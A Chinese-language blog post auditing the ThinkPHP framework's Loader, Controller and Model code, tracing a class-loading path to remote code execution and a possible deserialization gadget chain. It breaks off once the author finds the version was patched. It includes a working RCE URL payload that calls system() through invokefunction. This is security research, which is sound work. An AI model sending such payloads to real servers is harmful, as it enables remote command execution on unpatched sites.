<h1 id="Contoller-层审计"><a href="#Contoller-层审计" class="headerlink" title="Contoller 层审计"></a>Contoller 层审计</h1><h2 id="Loader-类加载机制"><a href="#Loader-类加载机制" class="headerlink" title="Loader 类加载机制"></a>Loader 类加载机制</h2><p>这个代码的核心方法：</p>
<ul>
<li><code>autoload($class)</code>: 自动加载。</li>
<li><code>register()</code>: 注册自动加载。  </li>
<li><code>import()</code>: 导入类库。    </li>
<li><code>model()</code>, <code>controller()</code>, <code>validate()</code>: 实例化特定的类。    </li>
<li><code>findFile()</code>: 查找文件路径。</li>
</ul>
<h3 id="寻找危险点"><a href="#寻找危险点" class="headerlink" title="寻找危险点"></a>寻找危险点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__include_file</span>(<span class="params"><span class="variable">$file</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">include</span> <span class="variable">$file</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里如果可以控制 <code>$file</code> 变量将会直接导致文件包含</p>
<p>通过搜索 new 关键字在代码中寻找可以实例化的对象</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//model</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>)) &#123;  </span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> <span class="variable">$class</span>();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//contorller</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="variable">$emptyClass</span>)) &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable">$emptyClass</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="追寻数据流"><a href="#追寻数据流" class="headerlink" title="追寻数据流"></a>追寻数据流</h3><h4 id="Loader-autoload"><a href="#Loader-autoload" class="headerlink" title="Loader::autoload"></a>Loader::autoload</h4><p>先来看看谁调用了 <code>__include_file</code><br><img src="/images/Pasted%20image%2020260127150016.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$file</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">findFile</span>(<span class="variable">$class</span>)) &#123;  </span><br><span class="line">    <span class="comment">// 非 Win 环境不严格区分大小写  </span></span><br><span class="line">    <span class="keyword">if</span> (!IS_WIN || <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_FILENAME) == <span class="title function_ invoke__">pathinfo</span>(<span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>), PATHINFO_FILENAME)) &#123;  </span><br><span class="line">        <span class="title function_ invoke__">__include_file</span>(<span class="variable">$file</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    retrun <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Loader-controller"><a href="#Loader-controller" class="headerlink" title="Loader::controller"></a>Loader::controller</h4><p>注意看到 <code>Loader::controller</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">controller</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span> = <span class="string">&#x27;controller&#x27;</span>, <span class="variable">$appendSuffix</span> = <span class="literal">false</span>, <span class="variable">$empty</span> = <span class="string">&#x27;&#x27;</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$class</span>) = <span class="built_in">self</span>::<span class="title function_ invoke__">getModuleAndClass</span>(<span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span>);  </span><br><span class="line">  <span class="comment">//通过调用getModuleAndClass来吧用户输入的字符串转换为php 能够识别的的类名方式</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">App</span>::<span class="title function_ invoke__">invokeClass</span>(<span class="variable">$class</span>);  </span><br><span class="line">    &#125;  <span class="comment">//若存在则实例化目标</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$empty</span>) &#123;  </span><br><span class="line">        <span class="variable">$emptyClass</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">parseClass</span>(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$empty</span>, <span class="variable">$appendSuffix</span>);  </span><br><span class="line">	  <span class="comment">//如果目标类不存在，且制定了$empty 参数，则会解析这个类名</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">class_exists</span>(<span class="variable">$emptyClass</span>)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="variable">$emptyClass</span>(<span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  <span class="comment">//但是这里并不能进行复杂的注入</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&#x27;class not exists:&#x27;</span> . <span class="variable">$class</span>, <span class="variable">$class</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Loader-getModuleAndClass"><a href="#Loader-getModuleAndClass" class="headerlink" title="Loader::getModuleAndClass"></a>Loader::getModuleAndClass</h4><p>跟进class_exists()和getModuleAndClass()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getModuleAndClass</span></span><br><span class="line"><span class="keyword">protected</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getModuleAndClass</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$layer</span>, <span class="variable">$appendSuffix</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;\\&#x27;</span>)) &#123;  </span><br><span class="line">        <span class="variable">$module</span> = <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">module</span>();  </span><br><span class="line">        <span class="variable">$class</span>  = <span class="variable">$name</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;  </span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$module</span>, <span class="variable">$name</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>, <span class="number">2</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="variable">$module</span> = <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>()-&gt;<span class="title function_ invoke__">module</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="variable">$class</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">parseClass</span>(<span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$name</span>, <span class="variable">$appendSuffix</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> [<span class="variable">$module</span>, <span class="variable">$class</span>];  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>如果传入的是带有 <code>\</code> 的类名，则不拼接路径，直接使用传入的类名。<br>如果传入的是带有 <code>/</code> 的路径，则会先拆解再拼接为完整的路径</p>
<h4 id="Loader-LoaderparseClass"><a href="#Loader-LoaderparseClass" class="headerlink" title="Loader::LoaderparseClass"></a>Loader::LoaderparseClass</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseClass</span>(<span class="params"><span class="variable">$module</span>, <span class="variable">$layer</span>, <span class="variable">$name</span>, <span class="variable">$appendSuffix</span> = <span class="literal">false</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$array</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>], <span class="string">&#x27;\\&#x27;</span>, <span class="variable">$name</span>));  </span><br><span class="line">    <span class="variable">$class</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">parseName</span>(<span class="title function_ invoke__">array_pop</span>(<span class="variable">$array</span>), <span class="number">1</span>);  </span><br><span class="line">    <span class="variable">$class</span> = <span class="variable">$class</span> . (<span class="title class_">App</span>::<span class="variable">$suffix</span> || <span class="variable">$appendSuffix</span> ? <span class="title function_ invoke__">ucfirst</span>(<span class="variable">$layer</span>) : <span class="string">&#x27;&#x27;</span>);  </span><br><span class="line">    <span class="variable">$path</span>  = <span class="variable">$array</span> ? <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="variable">$array</span>) . <span class="string">&#x27;\\&#x27;</span> : <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">App</span>::<span class="variable">$namespace</span> . <span class="string">&#x27;\\&#x27;</span> .  </span><br><span class="line">        (<span class="variable">$module</span> ? <span class="variable">$module</span> . <span class="string">&#x27;\\&#x27;</span> : <span class="string">&#x27;&#x27;</span>) .  </span><br><span class="line">        <span class="variable">$layer</span> . <span class="string">&#x27;\\&#x27;</span> . <span class="variable">$path</span> . <span class="variable">$class</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说就是把模块名+层名+类名拼接成可实例化的PHP 类的完整空间命名，在这里和最开始第一个 rce相类似，都没有去做过滤</p>
<h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">class_exists</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$class</span>, <span class="keyword">bool</span> <span class="variable">$autoload</span> = <span class="literal">true</span></span>): <span class="title">bool</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>来看到 class_exists，这个方法会自动启动 <code>autoload</code> ，所以此时利用链似乎就非常的明确了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">controller-&gt;getModuleAndClass</span><br><span class="line">   ↓</span><br><span class="line">class_exists</span><br><span class="line">   ↓</span><br><span class="line">autoload</span><br><span class="line">   ↓</span><br><span class="line">__include_file</span><br></pre></td></tr></table></figure>

<p>但是因为路径的过滤导致文件包含不能去实现，只能去包含其他的类去 rce，所以这里又回到了第一个 rce 的利用方法</p>
<h3 id="构造-payload-1"><a href="#构造-payload-1" class="headerlink" title="构造 payload"></a>构造 payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Controller-php"><a href="#Controller-php" class="headerlink" title="Controller.php"></a>Controller.php</h2><h3 id="Controller-construct"><a href="#Controller-construct" class="headerlink" title="Controller::__construct"></a>Controller::__construct</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Request <span class="variable">$request</span> = <span class="literal">null</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;view    = <span class="title class_">View</span>::<span class="title function_ invoke__">instance</span>(<span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;template&#x27;</span>), <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;view_replace_str&#x27;</span>));  <span class="comment">//初始化视图对象</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;request = <span class="title function_ invoke__">is_null</span>(<span class="variable">$request</span>) ? <span class="title class_">Request</span>::<span class="title function_ invoke__">instance</span>() : <span class="variable">$request</span>;  </span><br><span class="line">	  <span class="comment">//初始化 Request 请求对象</span></span><br><span class="line">    <span class="comment">// 控制器初始化  </span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_initialize</span>();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 前置操作方法  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;beforeActionList) &#123;  </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;beforeActionList <span class="keyword">as</span> <span class="variable">$method</span> =&gt; <span class="variable">$options</span>) &#123;  </span><br><span class="line">            <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$method</span>) ?  <span class="comment">//判断当前的数组是“索引数组”还是“关联数组”</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">beforeAction</span>(<span class="variable">$options</span>) :  </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">beforeAction</span>(<span class="variable">$method</span>, <span class="variable">$options</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Controller-beforeAction"><a href="#Controller-beforeAction" class="headerlink" title="Controller::beforeAction"></a>Controller::beforeAction</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">beforeAction</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$options</span> = []</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;only&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$options</span>[<span class="string">&#x27;only&#x27;</span>])) &#123;  </span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;only&#x27;</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;only&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">action</span>(), <span class="variable">$options</span>[<span class="string">&#x27;only&#x27;</span>])) &#123;  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;except&#x27;</span>])) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$options</span>[<span class="string">&#x27;except&#x27;</span>])) &#123;  </span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;except&#x27;</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$options</span>[<span class="string">&#x27;except&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">action</span>(), <span class="variable">$options</span>[<span class="string">&#x27;except&#x27;</span>])) &#123;  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$method</span>]);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到这里的 <code>call_user_func</code> ，如果要是可控参数，那么就能触发 rce<br>但是 <code>call_user_func</code> 的参数是 <code>[$this, $method]</code> ，这意味着调用的目标必须为Controller.php 的内部方法，无法利用它调用全局函数。并且 <code>protected $beforeActionList = []</code> ，除非存在某种变量覆盖漏洞</p>
<h2 id="Model-php"><a href="#Model-php" class="headerlink" title="Model.php"></a>Model.php</h2><h3 id="Model-toString"><a href="#Model-toString" class="headerlink" title="Model::__toString"></a>Model::__toString</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Model-toJson"><a href="#Model-toJson" class="headerlink" title="Model::toJson"></a>Model::toJson</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Model-toArray"><a href="#Model-toArray" class="headerlink" title="Model::toArray"></a>Model::toArray</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="variable">$append</span> = [<span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;status_text&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123; <span class="comment">//只有定义了 $append才能进入这个逻辑</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// ... 省略部分代码 ...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// [CRITICAL 1] 此时 $name 是我们可以控制的字符串</span></span><br><span class="line">        <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [CRITICAL 2] 检查该类中是否存在名为 $relation 的方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">            <span class="comment">// [CRITICAL 3] 动态调用该方法！！！</span></span><br><span class="line">            <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>(); </span><br><span class="line">            <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果能控制 <code>$this-&gt;append</code> ，就可以控制 <code>$relation</code> 变量。<br><code>Loader::parseName($name, 1, false)</code> 把字段名转化为了方法名比如：user_profile-&gt;userProfile<br>这样的话他可以任意调用Model 类的方法，并且还要无参</p>
<h3 id="Model-getQuery"><a href="#Model-getQuery" class="headerlink" title="Model::getQuery"></a>Model::getQuery</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getQuery</span>(<span class="params"><span class="variable">$buildNewQuery</span> = <span class="literal">false</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$buildNewQuery</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildQuery</span>();  </span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$links</span>[<span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>])) </span>&#123;  </span><br><span class="line">        <span class="comment">// 创建模型查询对象  </span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$links</span>[<span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>] = $<span class="title">this</span>-&gt;<span class="title">buildQuery</span>();  </span></span><br><span class="line"><span class="class">    &#125;  </span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">self</span>::$<span class="title">links</span>[$<span class="title">this</span>-&gt;<span class="title">class</span>];  </span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>
<p>通过对parseName($name, 1, false)中的 $name 传入get_query，会自动拼接为GetQuery(PHP 方法名不区分大小写)</p>
<h3 id="Model-buildQuery"><a href="#Model-buildQuery" class="headerlink" title="Model::buildQuery"></a>Model::buildQuery</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildQuery</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$con</span> = <span class="title class_">Db</span>::<span class="title function_ invoke__">connect</span>(<span class="variable">$connection</span>); </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$queryClass</span> = <span class="variable language_">$this</span>-&gt;query ?: <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">getConfig</span>(<span class="string">&#x27;query&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="variable">$query</span>      = <span class="keyword">new</span> <span class="variable">$queryClass</span>(<span class="variable">$con</span>, <span class="variable language_">$this</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$query</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要<code>$queryClass</code> 可控，就可以指定任意的类名，然后就会被实例化</p>
<p>但是在 <code>toArray()</code> 中，调用完 <code>$this-&gt;$relation()</code> 后，紧接着调用了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br></pre></td></tr></table></figure>
<p>而且</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br></pre></td></tr></table></figure>
<p>这里有一个 <strong>Type Hint</strong><br>这意味着 <code>getQuery()</code> 返回的对象（即我们在 <code>buildQuery</code> 中实例化的对象），<strong>必须</strong>是 <code>think\model\Relation</code> 的子类。如果不是，PHP 会抛出 Fatal Error。</p>
<p>就先到这吧，这时候才发现下载的是有补丁的版本</p>

          
          <div style="margin-top: 50px;">
            <script src="https://giscus.app/client.js"
              data-repo="Licivo/Licivo.github.io"
              data-repo-id="R_kgDOOQU8CQ"
              data-category="Announcements"
              data-category-id="DIC_kwDOOQU8Cc4C0Pub"
              data-mapping="pathname"
              data-strict="0"
              data-reactions-enabled="1"
              data-emit-metadata="0"
              data-input-position="bottom"
              data-theme="preferred_color_scheme"
              data-lang="zh-CN"
              crossorigin="anonymous"
              async>
            </script>
          </div>
        
      </div>

          
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left  disabled "
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2026/01/20/PHAR%20%E6%B3%A8%E5%85%A5/"
      title="PHAR 注入"
     >

    <p class="title-text">
      
        PHAR 注入
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>




    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2026 Licivo<br>
